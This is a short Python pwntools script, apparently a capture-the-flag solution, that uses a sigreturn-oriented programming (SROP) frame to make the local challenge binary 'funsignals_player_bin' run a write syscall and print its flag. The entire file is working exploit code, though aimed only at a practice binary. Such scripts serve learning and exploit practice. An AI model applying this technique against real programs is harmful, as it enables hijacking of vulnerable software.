from pwn import *

target = process('./funsignals_player_bin')
# gdb.attach(target, gdbscript='b *0x1000000b')

# Specify the architecture
context.arch = 'amd64'

frame = SigreturnFrame()

# set return pointer to a syscall
frame.rip = 0x1000000b

# set the values to trigger a write syscall that will print the flag
frame.rax = 0x1
frame.rdi = 0x1
frame.rsi = 0x10000023
frame.rdx = 0x30  # adjust this one if necessary, 0x400 is probably the max (whole stack)

target.send(bytes(frame))
target.interactive()
